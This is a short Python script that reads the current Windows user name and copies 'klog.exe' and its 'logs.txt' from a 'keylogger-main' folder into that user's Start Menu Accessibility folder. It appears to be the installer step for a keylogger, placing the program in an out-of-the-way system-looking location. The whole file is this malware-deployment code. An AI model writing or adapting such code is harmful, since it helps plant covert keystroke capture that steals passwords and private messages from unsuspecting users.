import shutil, getpass
username = getpass.getuser()
shutil.copyfile('D:\\klog.exe', 'C:\\Users\\' + str(username) + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessibility\\klog.exe')
shutil.copyfile('D:\\keylogger-main\\logs.txt', 'C:\\Users\\' + str(username) + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessibility\\logs.txt')
